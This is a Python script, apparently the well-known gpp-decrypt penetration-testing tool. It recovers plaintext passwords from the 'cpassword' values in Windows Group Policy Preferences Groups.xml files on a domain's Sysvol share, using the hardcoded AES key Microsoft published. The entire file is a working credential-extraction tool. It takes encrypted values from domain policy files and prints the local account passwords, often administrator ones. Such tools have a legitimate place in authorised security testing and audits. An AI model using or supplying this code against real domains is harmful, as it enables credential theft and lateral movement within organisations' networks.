#!/usr/bin/python
# Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
# This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
#
# Author: esec-pentest.sogeti.com
# Links:
#   http://esec-pentest.sogeti.com/post/Exploiting-Windows-2008-Group-Policy-Preferences
#
# Polished by: Oleg Mitrofanov (made it work with newer versions of PyCrypto)
 
import sys
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto import Random

def decrypt(cpassword): 
    # Key from MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = ("4e9906e8fcb66cc9faf49310620ffee8" 
          "f496e806cc057990209b09a433b66c1b").decode('hex')
     
    # Add padding to the base64 string and decode it
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = b64decode(cpassword)
     
    # Decrypt the password
    iv = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    o = AES.new(key, AES.MODE_CBC, iv).decrypt(password)
     
    return o[:-ord(o[-1])].decode('utf16')
 
if(len(sys.argv) != 2):
    print("Usage: python {} CPASSWORD".format(__file__))
    sys.exit(0)

cpassword = sys.argv[1]

try:
    print(decrypt(cpassword))
except:
    print("Fail! Make sure the supplied cpassword is correct.")
